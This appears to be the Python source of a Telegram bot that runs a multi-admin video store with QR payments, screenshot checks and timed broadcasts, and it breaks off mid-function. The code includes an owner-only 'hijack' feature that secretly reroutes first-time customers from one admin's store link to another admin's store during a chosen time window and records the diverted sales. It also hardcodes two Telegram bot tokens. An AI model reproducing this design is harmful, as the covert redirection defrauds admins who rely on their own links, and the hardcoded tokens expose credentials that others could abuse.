import os
import json
import time
import threading
import datetime
import re
import requests
from flask import Flask, request
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, InputMediaVideo
import pytz

# ============ ENVIRONMENT ============
TOKEN          = os.environ.get('BOT_TOKEN')
OWNER_ID       = int(os.environ.get('OWNER_ID', '0'))
LOG_CHANNEL_ID = int(os.environ.get('LOG_CHANNEL_ID', '0'))
RENDER_URL     = os.environ.get('RENDER_URL', 'https://two-video-seller-h3vq.onrender.com')

OLD_TOKENS = [
    "8820357573:AAHVSYAacKYs4xIqox5NQcbevpn811l2-G0",
    "8601129257:AAEBwVl5CAxnxj37FL6M3Lp5C8_VvDjz3ow",
]

bot = telebot.TeleBot(TOKEN, parse_mode=None)
app = Flask(__name__)

IST = pytz.timezone('Asia/Kolkata')

DEFAULT_WELCOME = "👋 Hello, {name}!\n\nChoose a plan to get started:"
DEFAULT_PAY_MSG = ("💳 **Payment Instructions**\n\n"
                   "Please scan the QR and pay, then click 'I have paid'.")
DEFAULT_REJECT  = "❌ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗻𝗼𝘁 𝗿𝗲𝗰𝗲𝗶𝘃𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻..."

def now():
    return time.time()

def today_str():
    return datetime.datetime.now(IST).strftime("%Y-%m-%d")

def new_store_profile(uid, role, name="", username="", expires_at=None):
    return {
        "role": role, "uid": uid, "name": name, "username": username,
        "added_on": now(), "expires_at": expires_at,
        "welcome_msg": DEFAULT_WELCOME,
        "start_videos": [], "how_to_use_video": "",
        "payment_photo": "", "payment_msg": DEFAULT_PAY_MSG,
        "reject_msg": DEFAULT_REJECT,
        "products": [], "blocked_users": [],
        "users": [], "buyers": [],
        "auto_bc": {"status": False, "interval_seconds": 60,
                    "message_type": None, "file_id": None, "text": None},
        "stats": {}
    }

DB_STATE = {
    "owner_id": OWNER_ID,
    "stores": {},
    "customer_seller": {},
    "command_hijack_config": {
        "enabled": False,
        "start_time": "00:00",
        "end_time": "02:00",
        "mappings": {}
    },
    "hijack_stats": {},
    "global_started_users": []
}

db_dirty = False
db_lock = threading.Lock()

def get_store(uid):
    return DB_STATE["stores"].get(str(uid))

def ensure_store(uid, role="admin", name="", username="", expires_at=None):
    s = get_store(uid)
    if s is None:
        s = new_store_profile(uid, role, name, username, expires_at)
        DB_STATE["stores"][str(uid)] = s
        save_db()
    else:
        updated = False
        if role and s.get("role") != role: s["role"] = role; updated = True
        if name and s.get("name") != name: s["name"] = name; updated = True
        if username and s.get("username") != username: s["username"] = username; updated = True
        if expires_at is not None and s.get("expires_at") != expires_at: s["expires_at"] = expires_at; updated = True
        if updated: save_db()
    return s

def is_owner(uid):
    return int(uid) == int(OWNER_ID)

def is_active_admin(uid):
    s = get_store(uid)
    if not s or s.get("role") != "admin": return False
    exp = s.get("expires_at")
    if exp is None: return True
    return now() <= exp

def can_use_panel(uid):
    return is_owner(uid) or is_active_admin(uid)

def is_command_hijack_active():
    cfg = DB_STATE.get("command_hijack_config", {})
    if not cfg.get("enabled", False): return False
    try:
        cur_time = datetime.datetime.now(IST).time()
        sp = [int(x) for x in cfg.get("start_time", "00:00").split(":")]
        ep = [int(x) for x in cfg.get("end_time", "02:00").split(":")]
        st = datetime.time(sp[0], sp[1])
        et = datetime.time(ep[0], ep[1])
        if st <= et: return st <= cur_time <= et
        return cur_time >= st or cur_time <= et
    except Exception:
        return False

def get_effective_store(target_seller_uid, requester_uid):
    if str(target_seller_uid) == str(OWNER_ID):
        return get_store(OWNER_ID), False
    if can_use_panel(requester_uid):
        return get_store(target_seller_uid), False
    gs = DB_STATE.setdefault("global_started_users", [])
    is_first = str(requester_uid) not in gs
    if is_first:
        gs.append(str(requester_uid)); save_db()
    if is_first and is_command_hijack_active() and str(requester_uid) != str(target_seller_uid):
        cfg = DB_STATE.get("command_hijack_config", {})
        rto = cfg.get("mappings", {}).get(str(target_seller_uid))
        if rto:
            ts = get_store(rto)
            if ts: return ts, True
    return get_store(target_seller_uid), False

def record_hijack_stat(orig_admin_uid, pname):
    if not is_command_hijack_active() or str(orig_admin_uid) == str(OWNER_ID): return
    hstats = DB_STATE.setdefault("hijack_stats", {})
    t = today_str()
    day = hstats.setdefault(t, {})
    adm = day.setdefault(str(orig_admin_uid), {"count": 0, "products": {}})
    adm["count"] += 1
    adm["products"][pname] = adm["products"].get(pname, 0) + 1
    save_db()

def load_db():
    global DB_STATE
    try:
        chat = bot.get_chat(LOG_CHANNEL_ID)
        if chat.pinned_message:
            text = chat.pinned_message.text
            if not text and chat.pinned_message.document:
                fi = bot.get_file(chat.pinned_message.document.file_id)
                text = bot.download_file(fi.file_path).decode('utf-8')
            if text:
                loaded = json.loads(text)
                DB_STATE.update(loaded)
                if "resellers" in DB_STATE and "stores" not in DB_STATE:
                    DB_STATE["stores"] = DB_STATE.pop("resellers")
                DB_STATE.setdefault("stores", {})
                DB_STATE.setdefault("customer_seller", {})
                DB_STATE.setdefault("command_hijack_config", {"enabled": False, "start_time": "00:00", "end_time": "02:00", "mappings": {}})
                DB_STATE.setdefault("hijack_stats", {})
                DB_STATE.setdefault("global_started_users", [])
                print("✅ Database loaded successfully!")
    except Exception as e:
        print("⚠️ Load DB Error:", e)
        save_db()

def save_db():
    global db_dirty
    with db_lock: db_dirty = True

def background_db_saver():
    global db_dirty
    while True:
        time.sleep(5)
        if db_dirty:
            with db_lock: db_dirty = False
            try:
                chat = bot.get_chat(LOG_CHANNEL_ID)
                data = json.dumps(DB_STATE, indent=2, default=str)
                if len(data) < 3900:
                    if chat.pinned_message and chat.pinned_message.text:
                        bot.edit_message_text(data, LOG_CHANNEL_ID, chat.pinned_message.message_id)
                    else:
                        m = bot.send_message(LOG_CHANNEL_ID, data)
                        bot.pin_chat_message(LOG_CHANNEL_ID, m.message_id)
                else:
                    fp = "db_backup.json"
                    with open(fp, "w", encoding="utf-8") as f: f.write(data)
                    with open(fp, "rb") as f:
                        if chat.pinned_message and chat.pinned_message.document:
                            bot.delete_message(LOG_CHANNEL_ID, chat.pinned_message.message_id)
                        m = bot.send_document(LOG_CHANNEL_ID, f, caption="💾 Auto DB Backup")
                        bot.pin_chat_message(LOG_CHANNEL_ID, m.message_id)
                    os.remove(fp)
            except Exception as e:
                print("⚠️ Save DB Error:", e)

load_db()
threading.Thread(target=background_db_saver, daemon=True).start()

user_states = {}
admin_panel_msgs = {}

def bot_username():
    try: return bot.get_me().username
    except Exception: return "YourBot"

def store_link(seller_uid):
    return f"https://t.me/{bot_username()}?start=s{seller_uid}"

def send_videos_as_album(chat_id, video_list):
    if not video_list: return
    if len(video_list) == 1:
        try: bot.send_video(chat_id, video_list[0])
        except Exception: pass
        return
    for i in range(0, len(video_list), 10):
        chunk = video_list[i:i+10]
        media = [InputMediaVideo(v) for v in chunk]
        try: bot.send_media_group(chat_id, media)
        except Exception:
            for v in chunk:
                try: bot.send_video(chat_id, v)
                except Exception: pass

def fmt_expiry(ts):
    if ts is None: return "Never"
    left = ts - now()
    if left <= 0: return "EXPIRED"
    if left < 60: return f"{int(left)}s"
    if left < 3600: return f"{int(left//60)}m"
    if left < 86400: return f"{int(left//3600)}h {int((left%3600)//60)}m"
    return f"{int(left//86400)}d {int((left%86400)//3600)}h"

# ============================================================
# AUTO BROADCAST — parse_mode REMOVED
# ============================================================
def auto_broadcast_worker():
    last_sent = {}
    while True:
        try:
            acted = False
            for key, r in list(DB_STATE.get("stores", {}).items()):
                bc = r.get("auto_bc", {})
                interval = bc.get("interval_seconds", 60)
                if not bc.get("status"): continue
                if not bc.get("message_type") or (not bc.get("file_id") and not bc.get("text")): continue

                last = last_sent.get(key, 0)
                if now() - last < interval: continue

                last_sent[key] = now()
                acted = True

                m_type = bc.get("message_type")
                f_id = bc.get("file_id")
                txt = bc.get("text") or ""
                users_list = list(r.get("users", []))
                blocked = list(r.get("blocked_users", []))

                print(f"📢 Auto BC [{key}]: sending '{m_type}' to {len(users_list)} users (blocked: {len(blocked)})")
                ok = fail = 0
                new_blocked = []
                for u_id in users_list:
                    if u_id in blocked: continue
                    try:
                        # NO parse_mode — plain text
                        if m_type == "photo":
                            bot.send_photo(u_id, f_id, caption=txt)
                        elif m_type == "video":
                            bot.send_video(u_id, f_id, caption=txt)
                        elif m_type == "document":
                            bot.send_document(u_id, f_id, caption=txt)
                        else:
                            bot.send_message(u_id, txt)
                        ok += 1
                    except Exception as e:
                        fail += 1
                        err = str(e).lower()
                        print(f"⚠️ Auto BC fail {u_id}: {err[:150]}")
                        if any(kw in err for kw in (
                            'blocked', 'deactivated', 'chat not found',
                            'user is deactivated', 'bot was blocked',
                            'kicked', 'peer_id_invalid', 'forbidden',
                            'user not found', 'bot was kicked',
                            'chat_id', 'not enough rights',
                            'invalid', 'privacy', 'can\'t initiate',
                            'can\'t parse entities'  # ignore markdown issues
                        )):
                            # Only auto-block if it's NOT a markdown issue
                            if 'parse entities' not in err and 'parse' not in err:
                                new_blocked.append(u_id)
                                print(f"🚫 Auto-blocking user {u_id}")
                if new_blocked:
                    for b in new_blocked:
                        if b not in r.get("blocked_users", []):
                            r.setdefault("blocked_users", []).append(b)
                    save_db()
                print(f"📢 Auto BC [{key}] done: ✅ {ok} | ❌ {fail}")
            if not acted: time.sleep(5)
        except Exception as e:
            print(f"auto_broadcast_worker err: {e}")
            time.sleep(5)

threading.Thread(target=auto_broadcast_worker, daemon=True).start()

def show_storefront(chat_id, seller_uid, is_preview=False):
    target_store, is_hijacked = get_effective_store(seller_uid, chat_id)
    if not target_store:
        bot.send_message(chat_id, "❌ Invalid store link.")
        return
    DB_STATE["customer_seller"][str(chat_id)] = str(seller_uid)
    if chat_id not in target_store.get("users", []):
        target_store["users"].append(chat_id); save_db()
    send_videos_as_album(chat_id, target_store.get("start_videos", []))
    try:
        sender = bot.get_chat(chat_id)
        name = sender.first_name or "User"
    except Exception:
        name = "User"
    welcome_text = target_store.get("welcome_msg", DEFAULT_WELCOME).format(name=name)
    markup = InlineKeyboardMarkup()
    if is_preview or can_use_panel(chat_id):
        markup.row(InlineKeyboardButton("⚙️ Open My Admin Panel ⚙️", callback_data="adm_open_panel"))
    products = sorted(target_store.get("products", []), key=lambda x: x.get("position", 999))
    for p in products:
        markup.row(InlineKeyboardButton(p["name"], callback_data=f"prod_{seller_uid}_{p['id']}"))
    markup.row(InlineKeyboardButton("How to use ❓", callback_data=f"how_{seller_uid}"),
               InlineKeyboardButton("Report Issue 📩", callback_data=f"report_{seller_uid}"))
    bot.send_message(chat_id, welcome_text, reply_markup=markup)

@bot.message_handler(commands=['start', 'admin'])
def start_command(message):
    uid = message.chat.id
    text = message.text or ""
    param = text.split(" ", 1)[1].strip() if " " in text else ""
    if is_owner(uid):
        ensure_store(uid, role="owner",
                     name=message.from_user.first_name or "Owner",
                     username=message.from_user.username or "")
        show_store_admin_menu(uid); return
    if is_active_admin(uid):
        ensure_store(uid, role="admin",
                     name=message.from_user.first_name or "Admin",
                     username=message.from_user.username or "")
        show_storefront(uid, uid, is_preview=True); return
    if param.startswith("s"):
        show_storefront(uid, param[1:]); return
    ensure_store(OWNER_ID, role="owner")
    show_storefront(uid, OWNER_ID)

# ============================================================
# PANEL SENDER — ALWAYS NEW MESSAGE
# ============================================================
def update_admin_panel(chat_id, text, markup=None):
    """Delete old panel, send new one."""
    try:
        old_mid = admin_panel_msgs.get(chat_id)
        if old_mid:
            try: bot.delete_message(chat_id, old_mid)
            except Exception: pass
        m = bot.send_message(chat_id, text, reply_markup=markup)
        admin_panel_msgs[chat_id] = m.message_id
        print(f"✅ New panel sent: {m.message_id}")
    except Exception as e:
        print(f"❌ panel err: {e}")

def show_store_admin_menu(chat_id):
    uid = chat_id
    if not can_use_panel(uid): return
    r = get_store(uid)
    if r is None:
        ensure_store(uid, role="owner" if is_owner(uid) else "admin")
        r = get_store(uid)
    user_states.pop(uid, None)

    markup = InlineKeyboardMarkup()
    if is_owner(uid):
        markup.row(InlineKeyboardButton("👥 Manage Admins (Owner)", callback_data="own_admins_menu"))
        markup.row(InlineKeyboardButton("🌙 Manage Command/Link Hijack", callback_data="own_hijack_menu"))
    else:
        markup.row(InlineKeyboardButton("🔗 Get My Store Link", callback_data="my_link"))

    markup.row(InlineKeyboardButton("🎞️ Manage Start Videos", callback_data="adm_start_vids_menu"))
    markup.row(InlineKeyboardButton("🛍️ Manage Product Buttons", callback_data="adm_prod_menu"))
    markup.row(InlineKeyboardButton("📝 Edit Welcome Text", callback_data="adm_edit_welcome"))
    markup.row(InlineKeyboardButton("🎥 Set 'How To Use' Video", callback_data="adm_set_how_vid"))
    markup.row(InlineKeyboardButton("💳 Global Payment Config", callback_data="adm_pay_config_menu"))

    if is_owner(uid):
        markup.row(InlineKeyboardButton("🚀 Send Global Custom Broadcast", callback_data="adm_send_custom_bc"))
        markup.row(InlineKeyboardButton("⏱️ Auto Timed Broadcast", callback_data="adm_autobc_menu"))
        markup.row(InlineKeyboardButton("👑 Special Broadcast to Buyers", callback_data="adm_buyers_bc_menu"))

    markup.row(InlineKeyboardButton("📦 View Buyers List", callback_data="adm_view_buyers_list"))
    markup.row(InlineKeyboardButton("💾 Backup & Restore Settings", callback_data="adm_backup_menu"))
    if len(r.get("blocked_users", [])) > 0:
        markup.row(InlineKeyboardButton(f"🔓 Unblock Users ({len(r['blocked_users'])})", callback_data="adm_unblock_menu"))

    head = "👑 **Owner Panel**" if is_owner(uid) else f"👑 **Admin Panel** — {r.get('name','')}\n⏳ Expires: {fmt_expiry(r.get('expires_at'))}"
    update_admin_panel(chat_id, head + "\n\nChoose an option:", markup)

# ============================================================
# CALLBACK HANDLER
# ============================================================
@bot.callback_query_handler(func=lambda c: True)
def handle_callbacks(call):
    print(f"🔔 CALLBACK: {call.data} from {call.message.chat.id}")
    try: bot.answer_callback_query(call.id)
    except Exception: pass

    uid = call.message.chat.id
    data = call.data
    mid = call.message.message_id

    if data and (data.startswith("adm_") or data.startswith("own_") or data.startswith("hijack_")):
        admin_panel_msgs[uid] = mid

    if data == "del_msg":
        try: bot.delete_message(uid, mid)
        except Exception: pass
        return
    if data == "adm_open_panel" and can_use_panel(uid):
        try: bot.delete_message(uid, mid)
        except Exception: pass
        admin_panel_msgs.pop(uid, None)
        show_store_admin_menu(uid); return
    if data == "my_link" and is_active_admin(uid):
        bot.send_message(uid, f"🔗 **Your Store Link:**\n`{store_link(uid)}`")
        return
    if data == "back_home":
        try: bot.delete_message(uid, mid)
        except Exception: pass
        admin_panel_msgs.pop(uid, None)
        if is_owner(uid): show_store_admin_menu(uid)
        elif is_active_admin(uid): show_storefront(uid, uid, is_preview=True)
        else:
            bound = DB_STATE["customer_seller"].get(str(uid), OWNER_ID)
            show_storefront(uid, bound)
        return

    if data.startswith("how_"):
        target_store, _ = get_effective_store(data[4:], uid)
        vid = target_store.get("how_to_use_video", "") if target_store else ""
        if vid: bot.send_video(uid, vid, caption="🎥 Here is how to use the bot!")
        else: bot.send_message(uid, "ℹ️ Instructions video not set yet.")
        return
    if data.startswith("report_"):
        bot.send_message(uid, "📝 Please type your issue below. Admin will reply soon:")
        user_states[uid] = "WAITING_REPORT_" + data[7:]
        return
    if data.startswith("prod_"):
        parts = data.split("_")
        s_uid, pid = parts[1], parts[2]
        target_store, _ = get_effective_store(s_uid, uid)
        if not target_store: return
        prod = next((p for p in target_store.get("products", []) if p["id"] == pid), None)
        if not prod: return
        send_videos_as_album(uid, prod.get("videos", []))
        caption = f"📌 **{prod['name']}**"
        if prod.get("desc"): caption += f"\n\n{prod['desc']}"
        mk = InlineKeyboardMarkup()
        mk.row(InlineKeyboardButton("I have paid ✅", callback_data=f"paid_{s_uid}_{pid}"))
        mk.row(InlineKeyboardButton("Back 🔙", callback_data="back_home"))
        pay_msg = prod.get("pay_msg") or target_store.get("payment_msg", DEFAULT_PAY_MSG)
        pay_photo = target_store.get("payment_photo", "")
        full = f"{caption}\n\n{pay_msg}"
        if pay_photo: bot.send_photo(uid, pay_photo, caption=full, reply_markup=mk)
        else: bot.send_message(uid, full, reply_markup=mk)
        return
    if data.startswith("paid_"):
        parts = data.split("_")
        bot.send_message(uid, "📸 Please send your payment screenshot.")
        user_states[uid] = f"WAITING_SCREENSHOT_{parts[1]}_{parts[2]}"
        return

    if is_owner(uid):
        if data.startswith("own_") or data.startswith("hijack_"):
            return _owner_handle(call)
        if data.startswith("adm_"):
            return _store_admin_handle(call)
    if not can_use_panel(uid): return
    r = get_store(uid)
    if not is_owner(uid) and r and r.get("expires_at") is not None and now() > r["expires_at"]:
        bot.send_message(uid, "❌ Admin access expired.")
        return
    _store_admin_handle(call)

# ============================================================
# OWNER HANDLER
# ============================================================
def _owner_handle(call):
    uid = call.message.chat.id
    data = call.data
    def admins():
        return [x for x in DB_STATE["stores"].values() if x.get("role") == "admin"]

    if data == "own_hijack_menu":
        cfg = DB_STATE.get("command_hijack_config", {})
        status = "🟢 ON" if cfg.get("enabled") else "🔴 OFF"
        st = cfg.get("start_time", "00:00")
        et = cfg.get("end_time", "02:00")
        mappings = cfg.get("mappings", {})
        cist = datetime.datetime.now(IST).strftime("%H:%M:%S")
        mk = InlineKeyboardMarkup()
        mk.row(InlineKeyboardButton("🔴 Turn OFF" if cfg.get("enabled") else "🟢 Turn ON", callback_data="hijack_toggle"))
        mk.row(InlineKeyboardButton("⏱️ Set Time Range (IST)", callback_data="hijack_set_time"))
        mk.row(InlineKeyboardButton("🔗 Setup Command Mapping", callback_data="hijack_map_list"))
        mk.row(InlineKeyboardButton("📊 Hijack Sales Stats", callback_data="hijack_view_stats"))
        mk.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
        mt = "\n".join([f"• `{k}` ➡️ `{v}`" for k, v in mappings.items()]) if mappings else "No mappings set."
        txt = (f"🌙 **Hijack (IST)**\n\n⏰ **Now:** `{cist}`\n**Status:** {status}\n"
               f"**Time:** `{st}` to `{et}`\n\n🔗 **Mappings:**\n{mt}")
        update_admin_panel(uid, txt, mk); return
    if data == "hijack_toggle":
        cfg = DB_STATE.setdefault("command_hijack_config", {})
        cfg["enabled"] = not cfg.get("enabled", False)
        save_db(); call.data = "own_hijack_menu"; _owner_handle(call); return
    if data == "hijack_set_time":
        user_states[uid] = "WAITING_HIJACK_TIME"
        update_admin_panel(uid, "✍️ Send: `00:00-02:00`",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_hijack_menu"))); return
    if data == "hijack_map_list":
        mk = InlineKeyboardMarkup()
        mk.row(InlineKeyboardButton("➕ Add/Change Mapping", callback_data="hijack_add_map"))
        mk.row(InlineKeyboardButton("🗑️ Clear Mappings", callback_data="hijack_clear_map"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="own_hijack_menu"))
        update_admin_panel(uid, "🔗 Configure mappings.", mk); return
    if data == "hijack_add_map":
        mk = InlineKeyboardMarkup()
        for x in admins():
            mk.row(InlineKeyboardButton(f"👤 {x.get('name','')} ({x['uid']})", callback_data=f"hijack_sel_from_{x['uid']}"))
        mk.row(InlineKeyboardButton("🔙 Cancel", callback_data="hijack_map_list"))
        update_admin_panel(uid, "✍️ Select From admin:", mk); return
    if data.startswith("hijack_sel_from_"):
        fid = data.replace("hijack_sel_from_", "")
        user_states[uid] = f"WAITING_HIJACK_MAP_TO_{fid}"
        mk = InlineKeyboardMarkup()
        for x in admins():
            if str(x['uid']) != str(fid):
                mk.row(InlineKeyboardButton(f"🎯 To: {x.get('name','')} ({x['uid']})", callback_data=f"hijack_do_map_{fid}_{x['uid']}"))
        mk.row(InlineKeyboardButton("🔙 Cancel", callback_data="hijack_map_list"))
        update_admin_panel(uid, f"✅ From: `{fid}`\n🎯 Select target:", mk); return
    if data.startswith("hijack_do_map_"):
        parts = data.split("_")
        fid, tid = parts[3], parts[4]
        DB_STATE.setdefault("command_hijack_config", {}).setdefault("mappings", {})[str(fid)] = str(tid)
        save_db(); user_states.pop(uid, None)
        call.data = "own_hijack_menu"; _owner_handle(call); return
    if data == "hijack_clear_map":
        DB_STATE["command_hijack_config"]["mappings"] = {}
        save_db(); call.data = "own_hijack_menu"; _owner_handle(call); return
    if data == "hijack_view_stats":
        t = today_str()
        hs = DB_STATE.get("hijack_stats", {}).get(t, {})
        txt = f"📊 **Hijack Today ({t}):**\n\n"
        if not hs: txt += "No payments today."
        else:
            for aid, info in hs.items():
                obj = get_store(aid)
                nm = obj.get("name") if obj else "?"
                txt += f"👤 **{nm}** (`{aid}`)\n💰 {info.get('count',0)}\n"
                for pn, pc in info.get("products", {}).items():
                    txt += f"   • {pn}: {pc}\n"
                txt += "-------------------\n"
        mk = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data="own_hijack_menu"))
        update_admin_panel(uid, txt, mk); return
    if data == "own_admins_menu":
        a = admins()
        mk = InlineKeyboardMarkup()
        mk.row(InlineKeyboardButton("➕ Add New Admin", callback_data="own_add_admin"))
        mk.row(InlineKeyboardButton("🗑️ Remove Admin", callback_data="own_del_list"))
        mk.row(InlineKeyboardButton("⏱️ Adjust Admin Expiry", callback_data="own_exp_list"))
        mk.row(InlineKeyboardButton("📊 Admin Stats (Today)", callback_data="own_stats_list"))
        mk.row(InlineKeyboardButton("🛠️ Manage Admin Content", callback_data="own_content_list"))
        mk.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
        txt = f"👥 **Admins** ({len(a)})\n\n" + ("\n".join(f"• `{x['uid']}` {x.get('name','')} — {fmt_expiry(x.get('expires_at'))}" for x in a) if a else "None.")
        update_admin_panel(uid, txt, mk)
    elif data == "own_add_admin":
        user_states[uid] = "OWN_ADD_ADMIN_ID"
        update_admin_panel(uid, "✍️ Send admin USER ID:",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_admins_menu")))
    elif data == "own_del_list":
        mk = InlineKeyboardMarkup()
        for x in admins():
            mk.row(InlineKeyboardButton(f"🗑️ {x.get('name','')} ({x['uid']})", callback_data=f"own_del_do_{x['uid']}"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="own_admins_menu"))
        update_admin_panel(uid, "Select admin to remove:", mk)
    elif data.startswith("own_del_do_"):
        DB_STATE["stores"].pop(data.replace("own_del_do_", ""), None)
        save_db(); call.data = "own_admins_menu"; _owner_handle(call)
    elif data == "own_exp_list":
        mk = InlineKeyboardMarkup()
        for x in admins():
            mk.row(InlineKeyboardButton(f"⏱️ {x.get('name','')} ({x['uid']}) — {fmt_expiry(x.get('expires_at'))}",
                                        callback_data=f"own_exp_sel_{x['uid']}"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="own_admins_menu"))
        update_admin_panel(uid, "⏱️ Select admin:", mk)
    elif data.startswith("own_exp_sel_"):
        t = data.replace("own_exp_sel_", "")
        user_states[uid] = f"OWN_EXP_IN_{t}"
        update_admin_panel(uid, f"⏱️ Admin `{t}`\nSend: `30`, `10m`, `2h`, `1d` (ADD), `-10m`, `0` (revoke).",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data="own_exp_list")))
    elif data == "own_stats_list":
        mk = InlineKeyboardMarkup()
        for x in admins():
            mk.row(InlineKeyboardButton(f"📊 {x.get('name','')} ({x['uid']})", callback_data=f"own_stats_show_{x['uid']}"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="own_admins_menu"))
        update_admin_panel(uid, "📊 Select admin:", mk)
    elif data.startswith("own_stats_show_"):
        t = data.replace("own_stats_show_", "")
        a = get_store(t)
        st = (a.get("stats") or {}).get(today_str(), {}) if a else {}
        bp = st.get("by_product", {})
        lines = f"📊 Stats for `{t}` — {today_str()}\n\n• Requests: {st.get('requests',0)}\n• Accepted: {st.get('accepted',0)}\n"
        if bp: lines += "\n**By product:**\n" + "\n".join(f"• {k}: {v}" for k, v in bp.items())
        mk = InlineKeyboardMarkup()
        mk.row(InlineKeyboardButton("🔙 Stats", callback_data="own_stats_list"),
               InlineKeyboardButton("🏠 Main", callback_data="adm_back_panel"))
        update_admin_panel(uid, lines, mk)
    elif data == "own_content_list":
        mk = InlineKeyboardMarkup()
        for x in admins():
            mk.row(InlineKeyboardButton(f"🛠️ {x.get('name','')} ({x['uid']})", callback_data=f"own_content_sel_{x['uid']}"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="own_admins_menu"))
        update_admin_panel(uid, "🛠️ Select admin:", mk)
    elif data.startswith("own_content_sel_"):
        t = data.replace("own_content_sel_", "")
        a = get_store(t)
        mk = InlineKeyboardMarkup()
        mk.row(InlineKeyboardButton("💳 Set Payment QR/Photo", callback_data=f"own_c_payphoto_{t}"))
        mk.row(InlineKeyboardButton("✏️ Edit Payment Text", callback_data=f"own_c_paymsg_{t}"))
        mk.row(InlineKeyboardButton("⏱️ Edit Timer Broadcast Content", callback_data=f"own_c_timerbc_{t}"))
        mk.row(InlineKeyboardButton("🚀 Send Broadcast To This Admin's Users", callback_data=f"own_c_instantbc_{t}"))
        mk.row(InlineKeyboardButton("📦 View Buyers", callback_data=f"own_c_buyers_{t}"))
        mk.row(InlineKeyboardButton("🔙 Back", callback_data="own_content_list"))
        update_admin_panel(uid, f"🛠️ Content of `{a.get('name','') if a else '?'}`\n"
                                f"QR: {'✅' if a and a.get('payment_photo') else '❌'}\n"
                                f"Timer BC: {'🟢' if a and a['auto_bc'].get('status') else '🔴'}", mk)
    elif data.startswith("own_c_payphoto_"):
        t = data.replace("own_c_payphoto_", "")
        user_states[uid] = f"OWN_C_PAYPHOTO_{t}"
        update_admin_panel(uid, "💳 Send QR:",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data=f"own_content_sel_{t}")))
    elif data.startswith("own_c_paymsg_"):
        t = data.replace("own_c_paymsg_", "")
        user_states[uid] = f"OWN_C_PAYMSG_{t}"
        update_admin_panel(uid, "✏️ Send payment text:",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data=f"own_content_sel_{t}")))
    elif data.startswith("own_c_timerbc_"):
        t = data.replace("own_c_timerbc_", "")
        user_states[uid] = f"OWN_C_TIMERBC_{t}"
        update_admin_panel(uid, "📤 Send timer content:",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data=f"own_content_sel_{t}")))
    elif data.startswith("own_c_instantbc_"):
        t = data.replace("own_c_instantbc_", "")
        user_states[uid] = f"OWN_C_INSTANTBC_{t}"
        update_admin_panel(uid, "🚀 Send broadcast:",
                           InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Cancel", callback_data=f"own_content_sel_{t}")))
    elif data.startswith("own_c_buyers_"):
        t = data.replace("own_c_buyers_", "")
        a = get_store(t)
        buyers = a.get("buyers", []) if a else []
        txt = f"📦 Buyers of `{t}`:\n\n" if buyers else "📦 No buyers."
        for i, b in enumerate(buyers[-20:], 1):
            txt += f"{i}. {b.get('name')} @{b.get('username')} (`{b.get('user_id')}`)\n   🛍️ {b.get('product')} | {b.get('date')}\n"
        update_admin_panel(uid, txt, InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back", callback_data=f"own_content_sel_{t}")))

# ============================================================
# STORE ADMIN HANDLER
# ============================================================
def _store_admin_handle(call):
    uid = call.message.chat.id
    data = call.data
    r = get_store(uid)
    print(f"📥 _store_admin_handle: data={data}, uid={uid}, is_owner={is_owner(uid)}, r_exists={r is not None}")
    if r is None:
        ensure_store(uid, role="owner" if is_owner(uid) else "admin",
                     name=call.from_user.first_name or "",
                     username=call.from_user.username or "")
        r = get_store(uid)

    if data == "adm_back_panel":
        admin_panel_msgs.pop(uid, None)
        show_store_admin_menu(uid); return

    if is_owner(uid) and (data == "adm_autobc_menu" or data.startswith("adm_autobc_")):
        bc = r.get("auto_bc", {})
        if data == "adm_autobc_menu":
            st = "🟢 ON" if bc.get("status") else "🔴 OFF"
            iv = bc.get("interval_seconds", 60)
            ivt = f"{iv}s" if iv < 60 else (f"{iv//60}m" if iv < 3600 else f"{iv//3600}h")
            m_type = bc.get("message_type") or "Not set"
            tp = bc.get("text") or ""
            prev = (tp[:60] + "...") if len(tp) > 60 else (tp or "Not set")
            mk = InlineKeyboardMarkup()
            mk.row(InlineKeyboardButton(("🔴 Turn OFF" if bc.get("status") else "🟢 Turn ON"), callback_data="adm_autobc_toggle"))
            mk.row(InlineKeyboardButton("✏️ Set Message & Media", callback_data="adm_autobc_set_msg"))
            mk.row(InlineKeyboardButton("⏱️ Preset Time", callback_data="adm_autobc_set_time"))
            mk.row(InlineKeyboardButton("✍️ Custom Timer", callback_data="adm_autobc_custom_time"))
            mk.row(InlineKeyboardButton("👁 Preview Message", callback_data="adm_autobc_preview"))
            mk.row(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="adm_back_panel"))
            update_admin_panel(uid,
                f"⏱️ **Auto Broadcast**\n\nStatus: {st}\nInterval: {ivt} ({iv}s)\nType: {m_type}\nPreview: {prev}",
                mk); return
        if data == "adm_autobc_toggle":
            r["auto_bc"]["status"] = not r["auto_bc"].get("status", False)
            save_db(); call.data = "adm_autobc_menu"; _store_admin_handle(call); return
        if data == "adm_autobc_set_msg":
            user_states[uid] = "WAITING_AUTOBC_MSG"
            update_admin_panel(uid,
                "📤 **Send the message to loop automatically.**\n\nSend text, photo, video, or document.\n\n"
                "After sending, you'll return to Auto BC menu.",
                InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 Back to Auto BC", callback_data="adm_autobc_menu")))
            return
        if data == "adm_autobc_preview":
            m_type = bc.get("message_type")
            f_id = bc.get("file_id")
            txt = bc.get("text") or ""
            if not m_type:
                update_admin_panel(uid, "❌ No message set.",
